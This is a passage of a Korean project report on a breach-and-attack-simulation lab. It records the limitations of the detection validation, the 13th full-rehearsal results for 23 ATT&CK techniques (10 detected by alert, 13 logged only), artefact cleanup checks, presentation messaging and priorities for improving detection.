- Prevented: 보안 통제가 공격을 차단했는가
- Detected: Alert가 발생했는가
- Logged: 원천 로그만 남았는가
- Missed: 로그/알림 모두 없었는가

현재 프로젝트는 Detection Validation에 가깝고, Prevention Validation은 약하다.

#### 3. Marker 기반 상관성은 보조 수준

Command-level marker를 넣었지만 모든 Windows 보안 이벤트에 marker가 직접 들어가지는 않는다. Kerberos, DCSync, NTDS 같은 이벤트는 프로토콜/보안 이벤트 중심이라 command marker가 원천 이벤트에 직접 포함되기 어렵다.

따라서 최종 판정은 다음 조합으로 봐야 한다.

- step started_at/finished_at 시간 범위
- 실행 주체/호스트
- Technique별 핵심 이벤트 필드
- marker_check 보조 증거

#### 4. Report score가 다소 관대할 수 있음

현재 리포트 점수는 실행 성공률, 로그 커버리지, alert 커버리지를 함께 반영한다. 23개 전체 실행 성공과 telemetry 100% 때문에 alert coverage가 약 70%여도 최종 점수가 87점으로 높게 나온다.

발표에서는 "87점이므로 완벽하다"가 아니라, "실행과 로그 수집은 안정화됐고, alert coverage 70%에서 7개 개선 백로그를 도출했다"로 설명하는 것이 안전하다.

#### 5. UI/운영 UX 개선 여지

- 전체 선택 후 Run까지의 흐름이 처음 보는 사람에게는 헷갈릴 수 있다.
- 위험 Technique은 실행 전 위험 태그와 safety gate 의미를 더 명확히 보여주는 것이 좋다.
- 실행 완료 후 report/backlog/technical evidence로 이동하는 동선이 더 직접적이면 좋다.

#### 6. Controller/Agent 보안

현재 Controller와 Agent 구조는 실습망/시연용이다. 상용 수준으로 보려면 다음이 필요하다.

- Agent 인증 토큰
- Job 서명 또는 무결성 검증
- Controller API 접근 제어
- Secret 관리 방식 개선
- Agent별 권한 최소화

#### 7. Cleanup 검증 자동화 부족

LSASS dump, psexec 임시 서비스, 업로드 exe 등 위험 산출물은 수동 확인으로 정리 상태를 검증했다. 상용 BAS라면 각 step 종료 후 cleanup assertion을 자동으로 수행하고 report에 남겨야 한다.

보완 방향:

- step별 cleanup_check 명세 추가
- 실행 후 파일/서비스/프로세스 잔존 여부 자동 확인
- cleanup 실패 시 report에서 별도 위험으로 표시

### 2026-05-31 13차 전체 리허설: Marker/Time-Window 반영 후

#### 실행 조건

- Operation: `op-20260531-135422-2c1f3c`
- 실행 방식: `/operations` API로 SB-AD 23개 Technique 전체 선택 실행
- 반영 사항:
  - Controller/Attacker 코드 반영
  - PC01/FS01 Agent 코드 반영
  - Attacker/PC01/FS01 BasAgent 재시작
  - step-level time window 기반 ELK 조회 적용
  - command-level marker 자동 주입 적용

#### 실행 결과

| 항목 | 결과 |
| --- | --- |
| 전체 Technique | 23 |
| 실행 성공 | 23 |
| 실행 실패 | 0 |
| 차단 | 0 |
| 시뮬레이션 | 0 |
| ELK 검증 | 23/23 |
| Source telemetry 확인 | 23/23 |
| Alert detected | 10 |
| Logged only | 13 |
| Missed | 0 |
| Marker 확인 | 18/23 |
| Report score | 76/100 |

#### Technique별 결과

| 번호 | Technique | 실행 | Source | Alert | Marker | 판정 |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | T1204.002 | success | O | X | O | logged_only |
| 2 | T1059.003 | success | O | X | O | logged_only |
| 3 | T1095 | success | O | X | O | logged_only |
| 4 | T1087.002 | success | O | O | O | detected |
| 5 | T1018 | success | O | O | O | detected |
| 6 | T1033 | success | O | O | O | detected |
| 7 | T1135 | success | O | O | O | detected |
| 8 | T1069 | success | O | O | O | detected |
| 9 | T1558.003 | success | O | X | O | logged_only |
| 10 | T1021.006 | success | O | X | O | logged_only |
| 11 | T1059.001 | success | O | X | O | logged_only |
| 12 | T1105 | success | O | X | O | logged_only |
| 13 | T1003.001 | success | O | O | O | detected |
| 14 | T1218.011 | success | O | X | O | logged_only |
| 15 | T1074.001 | success | O | X | O | logged_only |
| 16 | T1041 | success | O | X | O | logged_only |
| 17 | T1036.005 | success | O | X | O | logged_only |
| 18 | T1560.001 | success | O | X | O | logged_only |
| 19 | T1003.006 | success | O | O | X | detected |
| 20 | T1558.001 | success | O | O | X | detected |
| 21 | T1078.002 | success | O | O | X | detected |
| 22 | T1569.002 | success | O | O | X | detected |
| 23 | T1003.003 | success | O | X | X | logged_only |

#### 해석

이번 결과는 이전 12차 결과보다 alert detected 수가 줄었다. 이는 BAS가 나빠진 것이 아니라, 기존 120분 lookback 방식에서 섞이던 과거 alert가 step 실행 시간 범위 밖으로 제외됐기 때문이다.

따라서 13차 결과가 더 냉정한 결과다.

- 실행 안정성: 23/23 성공으로 좋음
- 로그 수집 커버리지: 23/23으로 좋음
- Alert 커버리지: 10/23으로 낮음
- 탐지 공백: 13개 logged_only로 확인됨
- Missed: 0개이므로 "로그 자체가 없는 미탐"은 없음

#### Marker 결과 해석

Marker는 18/23에서 확인됐다.

Marker가 확인되지 않은 19~23번은 주로 Attacker Linux에서 Impacket/Kerberos/SMB 방식으로 DC01에 영향을 주는 Technique이다. 이 경우 marker는 Attacker 로컬 로그에는 남지만, DC01 Windows Security 이벤트에는 직접 들어가지 않는다.

따라서 이 구간은 marker보다 다음 근거를 우선해야 한다.

- step 실행 시간
- DC01 Security Event 4662/4769/7045 등 핵심 이벤트
- 실행 주체 및 대상 호스트
- Impacket 명령 성공 여부

#### Cleanup 확인

- FS01 LSASS dump 파일: 남아 있지 않음
- DC01 psexec 임시 서비스 `pIwb`: 존재하지 않음
- DC01 psexec 임시 exe `DylNXEMu.exe`: 존재하지 않음

#### 발표용 메시지

가장 안전한 발표 메시지는 다음과 같다.

> BAS를 통해 23개 공격 Technique을 모두 실제 실행했고, 모든 Technique에서 원천 로그가 수집되는 것을 확인했습니다. 그중 10개는 Kibana Alert까지 발생했고, 13개는 로그는 남았지만 Alert가 발생하지 않아 탐지 룰 보완이 필요한 backlog로 분류했습니다. 즉, BAS를 통해 탐지 체계가 실제로 커버하는 영역과 로그만 남는 탐지 공백을 분리해 확인했습니다.

#### 다음 보완 우선순위

1. 13개 logged_only 항목 중 실제 룰이 없는 항목과 룰 조건 불일치 항목 분리
2. Kibana rule interval 때문에 늦게 생성되는 alert가 있는지 `BAS_ELK_WINDOW_AFTER_SECONDS` 조정 테스트
3. 19~23번처럼 DC 보안 이벤트 중심 Technique은 marker보다 protocol/security event 기반 correlation으로 설명
4. Report에 `marker_check` 결과를 명시적으로 표시
5. Cleanup assertion을 report에 자동 반영

#### 지연 Alert 재조회

Operation 완료 후 시간이 더 지난 뒤 동일한 step time window로 ELK 조회를 다시 수행했다.

결과:

- Alert detected 수는 10개로 동일
- Logged only 수는 13개로 동일
- 따라서 이번 결과는 단순히 Kibana rule interval 때문에 늦게 생기는 alert를 너무 빨리 조회한 문제로 보기는 어렵다.
- 현재 13개 logged_only는 실제 alert rule 부재, rule 조건 불일치, 또는 해당 Technique에 대한 alert coverage 공백으로 보는 것이 타당하다.
